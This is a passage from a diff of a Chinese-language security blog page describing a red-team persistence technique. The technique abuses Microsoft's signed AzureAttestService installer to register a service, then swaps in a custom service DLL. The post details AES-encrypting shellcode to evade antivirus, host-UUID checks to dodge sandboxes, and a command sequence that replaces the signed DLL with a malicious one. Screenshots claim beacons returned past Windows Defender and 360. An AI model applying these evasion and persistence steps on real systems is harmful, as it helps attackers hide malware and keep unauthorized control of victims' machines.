+<h3 id="0x4-2-Shellcode加密"><a href="#0x4-2-Shellcode加密" class="headerlink" title="0x4-2 Shellcode加密"></a>0x4-2 Shellcode加密</h3><p>一般来说将<code>shellcode</code>分离加载的规避效果要好于直接硬编码，该位置使用<code>AES</code>算法对原始<code>shellcode</code>文件进行加密，在加密后安全软件无法确定程序意图，之后在服务DLL中读取加密文件内容后<code>AES</code>解密执行。我们通过复用<a target="_blank" rel="noopener" href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">Brownie</a>中的<code>AES</code>相关代码来实现对<code>shellcode</code>的加解密，要注意在<code>char*</code>和<code>std::string</code> 类型转换时，如果存在<code>\x00</code>会导致截断，所以使用了C++ <code>string::assign()</code>方法赋值:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/814fdecbd6a5fbadf520929bb626f06c.png"><br>还需要注意的是，加密脚本中将<code>iv</code>值放在加密文件末尾，<code>API</code>函数<code>GetFileSize</code>在读取文件时如果在文件末尾存在<code>\x00</code>时会忽略该数据，导致读取到的数据大小与实际不符:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/8d79a84d4de481b1f62857ca791f4c9e.png"><br>在<code>AES</code>加密的<code>python</code>脚本中有对应注释:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/556ad86eef7152cb795be4f62e440426.png"><br>实际使用的是随机提取的<code>iv</code>值 <code>iv = Random.new().read(AES.block_size)</code>，在没完全理解该随机方法之前错误估计该值最后一位有几率取到<code>\x00</code>，改了下代码把最后一个元素设置为了固定值，导致了后续解密时一个<code>bug</code>产生:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/8b3df0ac769db69e25a02d59d8ca6096.png"><br>这样改动后解密出来的<code>shellcode</code>就有部分字节与源数据不一致:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/8a6050213176edd4eb743a85661ce55a.png"><br>意识到解密存在错误后，将加密代码恢复原样后，成功在测试程序中解密并执行了<code>shellcode</code>，同时<code>windows defender</code>保持静默:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/8239395a300f0663f1a4a9492c407103.png"></p>
+<h3 id="0x4-3-主机指纹识别"><a href="#0x4-3-主机指纹识别" class="headerlink" title="0x4-3 主机指纹识别"></a>0x4-3 主机指纹识别</h3><p>在获得目标主机权限后需要获取其产品<code>uuid</code>，然后硬编码到服务DLL中用于和<code>WQL</code>查询得到的主机<code>uuid</code>信息对比，检测该主机是否为预设主机，以此规避沙箱环境。命令模式下可使用<code>wmic csproduct list full</code> 查询产品信息中的主机<code>uuid</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/9f218be4c058f57bcec292172f125073.png"><br><code>GUI</code>下可使用<code>wbemtest</code>命令打开实用工具枚举实例 <code>Win32_ComputerSystemProduct</code>实例：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/4476fd316acf055b1b6961d79ebe1d8a.png"><br>DLL中通过<code>C++</code>使用<code>COM</code>编程执行<code>WQL</code>查询获取<code>uuid</code>的代码直接修改自<code>MSDN</code>上的示例<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/example--getting-wmi-data-from-the-local-computer">wmi-data-from-the-local-computer</a>，需要查询<code>Win32_ComputerSystemProduct</code>类中<code>uuid</code>的值:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/6d3a8050f7dd8010e369680ca31896f3.png"><br>查询到结果后判断<code>uuid</code>是否与预设相等:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/cc18b51fc76c7d570367029a7391914d.png"><br>程序执行后成功确认了主机<code>uuid</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/8b046305d10c4d1cab308cad74e7f469.png"><br>在测试程序中实现<code>uuid</code>检测后，需要将测试好的代码移植到服务DLL中，完成后运行测试发现一个之前遇到的<code>CoInitializeSecurity</code>已被调用问题，因为是在线程中进行<code>COM</code>调用，可能在之前已经有过<code>COM</code>调用，所以加入返回值判断即可：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/43ce3820b11d755af5eb27fc1c3bd664.png"><br>启动服务后查看写入的日志，发现已经成功执行<code>shellcode</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/a546c838d919e7d060ab763873f43c79.png"><br>最后将官方<code>AzureAttestService.dll</code>(147kb)的资源信息也拷贝到自编写的服务DLL中(72kb):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/ca52f6a5a785fc1875fa60dadfd03320.png"><br>这一步的规避措施就编写完毕了，接下来对服务DLL进行测试。</p>
+<h2 id="0x05-安装服务DLL"><a href="#0x05-安装服务DLL" class="headerlink" title="0x05 安装服务DLL"></a>0x05 安装服务DLL</h2><p>在上文中已经编写好了服务类型DLL并使用了一些规避手段，直接通过安装程序命令安装服务:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/6531952218bd67047efd6a9052b9cc41.png"><br>在PID为1664的<code>svchost.exe</code>进程中成功执行了<code>shellcode</code>返回<code>beacon</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/be155d973e5e5fcaaadbf0694e03dc40.png"><br>在实际利用过程中，如果直接将自编写的服务DLL进行注册，会被安全软件行为拦截:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/f7dae8d9b0b24f747e613dba309484d4.png"><br>所以应该先使用都具有签名的文件注册服务，然后停止服务并替换服务DLL文件。刚好签名文件<code>AzureAttestServiceInstaller.exe</code>提供了操作需要的命令：</p>
+<pre><code class="line-numbers language-cmd">// 安装签名服务DLL
+AzureAttestServiceInstaller.exe -Install AzureAttestService.dll
+// 完成后停止服务，解除DLL文件占用
+AzureAttestServiceInstaller.exe -StopService
+// 替换服务DLL
+move AzureAttestService.dll AzureAttestService.dll.bak
+move ServiceDLL.dll AzureAttestService.dll
+// 启动服务，执行恶意代码
+AzureAttestServiceInstaller.exe -StartService</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/8fba499cecad9cfdbf50b2652c69afea.png"><br>服务成功在PID为2920的<code>svchost.exe</code>中启动:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/666bb9e479c7f92b61249684cbae01fc.png"><br>之后成功返回了<code>beacon</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/81e913d3e3668dda0e0726acfeb774fc.png"><br>最终我们可以在<code>windows defender</code>和数字卫士全家桶保护的主机中成功启动PID为428的<code>svchost</code>服务进程:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/8ee072f52acf82302d9e98d7d22cd617.png"><br>在等待一段时间之后，成功返回了<code>beacon</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/c3a88226cb0dddb5459fb05359924de9.png"></p>
+<h2 id="0x06-文末总结"><a href="#0x06-文末总结" class="headerlink" title="0x06 文末总结"></a>0x06 文末总结</h2><p>本文记录了从发现<code>AzureAttestService</code>服务注册机制，提取出具有签名的服务安装程序和服务DLL，随后利用签名文件注册服务、停止服务绕过安全软件行为监控获得已创建完成的系统服务，再替换服务DLL文件获得持久化的过程。<br>在服务DLL中实现了代码加密，随机延迟，主机<code>uuid</code>检测等规避手段，绕过两种安全软件保护达到了在目标主机进行持久化效果。</p>
+<h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function">writing-a-servicemain-function</a><br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain">persisting-in-svchost.exe-with-a-service-dll-servicemain</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-ca/azure/attestation/overview">https://docs.microsoft.com/en-ca/azure/attestation/overview</a><br><a target="_blank" rel="noopener" href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -675,7 +579,7 @@ BOOL SpawnProcess(char* runcmdline) {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yanghaoi.github.io/2022/03/28/windows-installer-an-zhuang-bao-de-gou-jian-he-zhi-xing/">https://yanghaoi.github.io/2022/03/28/windows-installer-an-zhuang-bao-de-gou-jian-he-zhi-xing/</a>
+                    <a href="https://yanghaoi.github.io/2022/08/29/azureattestservice-quan-xian-wei-chi-bai-li-yong/">https://yanghaoi.github.io/2022/08/29/azureattestservice-quan-xian-wei-chi-bai-li-yong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -713,12 +617,8 @@ BOOL SpawnProcess(char* runcmdline) {
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Proxy-Execution/">
-                                    <span class="chip bg-color">Proxy Execution</span>
-                                </a>
-                            
-                                <a href="/tags/Msiexec/">
-                                    <span class="chip bg-color">Msiexec</span>
+                                <a href="/tags/LOLBAS/">
+                                    <span class="chip bg-color">LOLBAS</span>
                                 </a>
                             
                         </div>
@@ -1023,9 +923,10 @@ BOOL SpawnProcess(char* runcmdline) {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/08/29/azureattestservice-quan-xian-wei-chi-bai-li-yong/">
                     <div class="card-image">
@@ -1042,9 +943,9 @@ BOOL SpawnProcess(char* runcmdline) {
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1057,6 +958,7 @@ BOOL SpawnProcess(char* runcmdline) {
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1075,23 +977,23 @@ BOOL SpawnProcess(char* runcmdline) {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/18/360-ge-chi-sha-xiang-tao-yi/">
+                <a href="/2022/03/28/windows-installer-an-zhuang-bao-de-gou-jian-he-zhi-xing/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/16.jpg" class="responsive-img" alt="360隔离沙箱逃逸">
+                        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/7.jpg" class="responsive-img" alt="Windows Installer安装包的构建和执行">
                         
-                        <span class="card-title">360隔离沙箱逃逸</span>
+                        <span class="card-title">Windows Installer安装包的构建和执行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            研究在360安全沙箱环境下的几种沙箱逃逸，分析这些方式的权限和区别，最后使用最优的利用方式进行POC和EXP的编写，并完成实验。
+                            生成msi安装包执行自定义载荷的详细步骤方法。msiexec命令执行远程msi安装包、本地dll获得命令执行的方法研究。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-28
                             </span>
                         <span class="publish-author">
                             
@@ -1108,8 +1010,12 @@ BOOL SpawnProcess(char* runcmdline) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
-                        <span class="chip bg-color">沙箱逃逸</span>
+                    <a href="/tags/Proxy-Execution/">
+                        <span class="chip bg-color">Proxy Execution</span>
+                    </a>
+                    
+                    <a href="/tags/Msiexec/">
+                        <span class="chip bg-color">Msiexec</span>
                     </a>
                     
                 </div>
